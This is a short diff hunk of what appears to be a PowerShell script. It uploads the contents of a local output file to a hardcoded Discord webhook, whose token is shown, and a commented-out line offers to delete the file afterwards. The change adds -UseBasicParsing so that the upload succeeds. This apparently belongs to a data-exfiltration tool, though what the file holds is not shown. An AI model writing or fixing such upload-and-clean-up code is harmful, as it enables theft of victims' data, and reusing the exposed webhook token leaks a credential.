@@ -105,7 +105,7 @@ $WEBHOOK_URL = "https://discord.com/api/webhooks/1478994129508892672/lA7G6TFM417
 $content = Get-Content $OUTPUT -Raw
 $data = @{content = $content} | ConvertTo-Json
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
-Invoke-WebRequest -Uri $WEBHOOK_URL -Method POST -Body $bytes -ContentType 'application/json'
+Invoke-WebRequest -Uri $WEBHOOK_URL -Method POST -Body $bytes -ContentType 'application/json' -UseBasicParsing
 
 # Clean up (uncomment to delete local file)
 # Remove-Item $OUTPUT -Force
